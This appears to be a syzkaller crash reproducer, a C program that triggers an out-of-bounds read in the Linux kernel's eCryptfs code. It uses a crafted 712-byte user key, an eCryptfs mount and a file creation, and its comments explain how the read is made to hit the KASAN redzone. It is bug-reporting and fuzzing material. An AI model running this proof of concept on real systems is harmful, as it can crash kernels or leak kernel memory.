// https://syzkaller.appspot.com/bug?id=05fc51b277ff74d2f38fd42a38e001452e953fe5
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <errno.h>

#define KEY_SPEC_THREAD_KEYRING -1

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    /* 
     * We want the payload size to be exactly 712 bytes.
     * sizeof(struct user_key_payload) is 24 bytes.
     * The total allocation size will be 24 + 712 = 736 bytes.
     * kmalloc(736) uses the kmalloc-1024 cache.
     * KASAN places the redzone exactly at offset 736.
     * 
     * auth_tok points to ukp->data (offset 24).
     * auth_tok->token.password.signature is at offset 712 from auth_tok.
     * So the signature is at offset 24 + 712 = 736 from the start of the allocation.
     * Reading the signature will hit the KASAN redzone exactly, guaranteeing a crash.
     */
    size_t payload_size = 712;
    char *payload = calloc(1, payload_size);
    if (!payload) {
        printf("[-] Failed to calloc: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] calloc successful.\n");
    
    uint16_t version = 0x0004;
    uint16_t token_type = 0; /* ECRYPTFS_PASSWORD */
    
    /* Populate the required fields to pass ecryptfs_verify_auth_tok_from_key() */
    memcpy(&payload[0], &version, sizeof(version));
    memcpy(&payload[2], &token_type, sizeof(token_type));
    
    /* Add a user key with a 16-hex-character description matching the mount sig */
    long key_res = syscall(__NR_add_key, "user", "1234567812345678", payload, payload_size, KEY_SPEC_THREAD_KEYRING);
    if (key_res < 0) {
        printf("[-] Failed to add_key: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] add_key successful.\n");
    
    int mkdir_lower_res = mkdir("/tmp/lower", 0777);
    if (mkdir_lower_res < 0 && errno != EEXIST) {
        printf("[-] Failed to mkdir /tmp/lower: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] mkdir /tmp/lower successful.\n");

    int mkdir_upper_res = mkdir("/tmp/upper", 0777);
    if (mkdir_upper_res < 0 && errno != EEXIST) {
        printf("[-] Failed to mkdir /tmp/upper: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] mkdir /tmp/upper successful.\n");

    int unlink_res = unlink("/tmp/lower/test_file");
    if (unlink_res < 0 && errno != ENOENT) {
        printf("[-] Failed to unlink /tmp/lower/test_file: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] unlink successful.\n");
    
    /* Mount eCryptfs using the signature of the key we just added */
    int mount_res = mount("/tmp/lower", "/tmp/upper", "ecryptfs", 0, 
              "ecryptfs_sig=1234567812345678,ecryptfs_cipher=aes,ecryptfs_key_bytes=16");
    if (mount_res < 0) {
        printf("[-] Failed to mount ecryptfs: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] mount ecryptfs successful.\n");
    
    /* Create a file to trigger write_tag_3_packet() and the OOB read */
    int fd = open("/tmp/upper/test_file", O_CREAT | O_RDWR, 0666);
    if (fd < 0) {
        printf("[-] Failed to open file: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open file successful.\n");
    
    int close_res = close(fd);
    if (close_res < 0) {
        printf("[-] Failed to close file: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] close file successful.\n");
    
    return 0;
}